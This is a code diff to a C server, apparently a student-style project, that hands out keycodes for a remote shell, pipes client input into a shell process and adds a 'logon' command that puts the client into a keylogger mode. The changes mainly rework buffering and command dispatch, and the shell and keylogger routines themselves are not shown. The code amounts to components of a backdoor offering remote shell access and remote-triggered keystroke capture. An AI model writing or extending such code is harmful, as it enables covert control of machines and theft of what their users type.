@@ -40,8 +40,7 @@ bool	check_server_password(t_server *server, char *input)
 	return (false);
 }
 
-void	handle_handshake(t_server *server, int index, char *input)
-{
+void	handle_handshake(t_server *server, int index, char *input) {
 	t_client *const	client = &server->clients[index];
 
 	if (client->status == HANDSHAKE)
@@ -50,6 +49,7 @@ void	handle_handshake(t_server *server, int index, char *input)
 		if (search_password(server, input) == true)
 		{
 			shell_function(server, index);
+			client->status = SHELL;
 			return ;
 		}
 		if (check_server_password(server, input) == false)
@@ -59,51 +59,125 @@ void	handle_handshake(t_server *server, int index, char *input)
 		}
 		ft_dprintf(2, "Valid KEY\n");
 		client->status = CONNECTED;
+		add2buffer(&server->clients[index], ft_strdup("$> "));
 	}
-	send(client->fd, "$> ", 3, 0);
 }
 
 void	add_password(t_server *server, int index)
 {
-	const int	client_fd = server->clients[index].fd;
 	char		*password = gen_random_password();
 	t_list		*new_node = ft_lstnew(password);
 	char		msg_connection[300] = {0};
 
 	ft_lstadd_back(&server->passwords, new_node);
 	sprintf(msg_connection, "To access the remote shell, use the next Keycode -> [%s]\n", password);
-	send(client_fd, msg_connection, strlen(msg_connection), 0);
+	add2buffer(&server->clients[index], ft_strdup(msg_connection));
 }
 
 void	delete_client(t_server *server, int index)
 {
-	const int	client_fd = server->clients[index].fd;
+	t_client *client = &server->clients[index];
 
+	close(client->fd);
+	if (client->inpipe_fd && client->outpipe_fd) {
+		close(client->inpipe_fd);
+		close(client->outpipe_fd);
+	}
 	memset(&server->clients[index], 0, sizeof(t_client));
-	close(client_fd);
 	server->nbr_clients--;
+}
+
+void	nstats(t_server *s, int index)
+{
+	char		msg[300] = {0};
+
+	sprintf(msg, "Total inbytes: %ld\nTotal outbytes: %ld\nSession inbytes: %ld\nSession outbytes: %ld\n\n",
+		s->total_inbytes, s->total_outbytes, s->clients[index].inbytes, s->clients[index].outbytes );
+	add2buffer(&s->clients[index], ft_strdup(msg));
 }
 
 int	handle_commands(t_server *server, int index, char *input)
 {
-	const t_client	*client = &server->clients[index];
+	t_client	*client = &server->clients[index];
 
 	if (strcmp("clear", input) == 0)
 	{
-		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
+		add2buffer(&server->clients[index], ft_strdup(CLEAR_CODE));
 	}
 	else if (strcmp("shell", input) == 0)
 	{
 		ft_dprintf(2, "client_fd: %d\n", client->fd);
 		add_password(server, index);
-		delete_client(server, index);
+		client->disconnect = true;
+		//delete_client(server, index);
+	}
+	else if (strcmp("logon", input) == 0)
+	{
+		client->status = KEYLOGGER;
+		keylogger_function(server, index);
+		return (0);
+	}
+	else if (strcmp("nstats", input) == 0)
+	{
+		nstats(server, index);
 	}
 	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
 	{
-		send(client->fd, HELP, sizeof(HELP), 0);
+		add2buffer(&server->clients[index], ft_strdup(HELP));
 	}
-	send(client->fd, "$> ", 3, 0);
+	add2buffer(client, ft_strdup("$> "));
 	return (0);
+}
+
+int	handle_inpipe(t_server *server, int index, char *input)
+{
+	t_client	*client = &server->clients[index];
+	//printf("trying to write inpipe, fdisset %i\n", FD_ISSET(client->inpipe_fd, &server->wfds));
+	if (client->inpipe_fd && FD_ISSET(client->inpipe_fd, &server->wfds))
+	{
+		//printf("writing inpipe!\n");
+		int r = write(client->inpipe_fd, input, strlen(input));
+		if (r < 0) {
+			close(client->inpipe_fd);
+			client->inpipe_fd = 0;
+			close(client->outpipe_fd);
+			client->outpipe_fd = 0;
+			client->status = CONNECTED;
+			client->response_bffr = strdup("$> ");
+		}
+	}
+	return 0;
+}
+
+int	extract_outpipe(t_server *server, int index)
+{
+	char buffer[4096];
+
+	memset(buffer, 0, sizeof(buffer));
+	int			r = 0;
+	t_client	*client = &server->clients[index];
+	//printf("trying to read outpipe %i, fdisset %i\n", client->outpipe_fd, FD_ISSET(client->outpipe_fd, &server->rfds));
+	if (client->outpipe_fd && FD_ISSET(client->outpipe_fd, &server->rfds))
+	{
+		r = read(client->outpipe_fd, buffer, 4095);
+		//printf("reading outpipe! (bytes: %i)\n", r);
+		if (r == 0) {
+			close(client->inpipe_fd);
+			client->inpipe_fd = 0;
+			close(client->outpipe_fd);
+			client->outpipe_fd = 0;
+			client->status = CONNECTED;
+			client->response_bffr = strdup("$> ");
+		}
+		if (r > 0)
+		{
+			client->response_bffr = calloc(r + 1, 1);
+			memcpy(client->response_bffr, buffer, r);
+		}
+		if (r < 0)
+			client->response_bffr = ft_strdup("errooooor\n");
+	}
+	return r;
 }
 
 int	handle_input(t_server *server, int index, char *buffer)
@@ -117,6 +191,8 @@ int	handle_input(t_server *server, int index, char *buffer)
 		handle_handshake(server, index, input);
 	else if (client->status == CONNECTED)
 		fd = handle_commands(server, index, input);
+	else if (client->status == SHELL || client->status == KEYLOGGER)
+		fd = handle_inpipe(server, index, buffer);
 	free(input);
 	return (fd);
 }
